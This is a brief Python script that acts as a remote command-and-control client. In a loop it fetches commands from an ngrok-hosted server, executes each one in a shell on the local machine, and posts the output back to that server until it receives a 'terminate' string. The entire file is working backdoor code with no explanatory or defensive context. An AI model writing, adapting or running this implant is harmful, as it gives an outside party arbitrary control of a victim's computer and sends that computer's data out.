import requests, os, subprocess, time

# Use the ngrok URL for the remote server
ngrok_url = 'https://56e3-120-151-185-163.ngrok-free.app'

while True:
    req = requests.get(ngrok_url)
    c2_command = req.text
    if 'terminate' in c2_command:
        break
    else:
        CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=ngrok_url, data=CMD.stdout.read())
